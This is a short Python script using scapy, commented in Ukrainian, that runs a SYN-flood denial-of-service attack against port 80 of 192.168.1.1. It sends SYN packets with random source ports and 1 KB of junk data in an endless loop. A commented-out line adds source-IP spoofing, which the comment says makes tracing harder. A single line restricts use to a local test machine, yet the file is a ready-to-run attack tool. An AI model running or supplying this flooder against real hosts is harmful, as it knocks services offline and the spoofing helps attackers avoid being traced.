from scapy.all import * #

def main():
    print("--- Тестування SYN Flooding ---")
    
    # Встановлюємо IP-адресу цілі (ОБОВ'ЯЗКОВО: тільки локальний тестовий роутер/машина!)
    target_ip = "192.168.1.1" #
    
    # Встановлюємо цільовий порт (наприклад, 80 для HTTP)
    target_port = 80 #
    
    print(f"Формування пакетів для атаки на {target_ip}:{target_port}...")

    # 1. Формуємо IP-рівень. 
    # Щоб ускладнити відстеження, можна увімкнути IP-спуфінг (підміну адреси відправника),
    # розкоментувавши наступний рядок і закоментувавши базовий ip = IP(dst=target_ip):
    # ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip) #[cite: 7]
    ip = IP(dst=target_ip) #[cite: 7]

    # 2. Формуємо TCP-рівень
    # Встановлюємо випадковий вихідний порт (sport) і прапорець "S" (SYN)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S") #[cite: 7]

    # 3. Додаємо 1 КБ "сміттєвих" даних для додаткового навантаження на канал
    raw = Raw(b"X" * 1024) #[cite: 7]

    # Збираємо шари в один пакет
    p = ip / tcp / raw #[cite: 7]

    print("[!] Запуск атаки. Натисніть CTRL+C для зупинки.")
    
    # Надсилаємо пакети в безкінечному циклі
    # verbose=0 вимикає виведення кожного пакета в консоль, щоб не сповільнювати скрипт
    send(p, loop=1, verbose=0) #[cite: 7]

if __name__ == "__main__":
    main()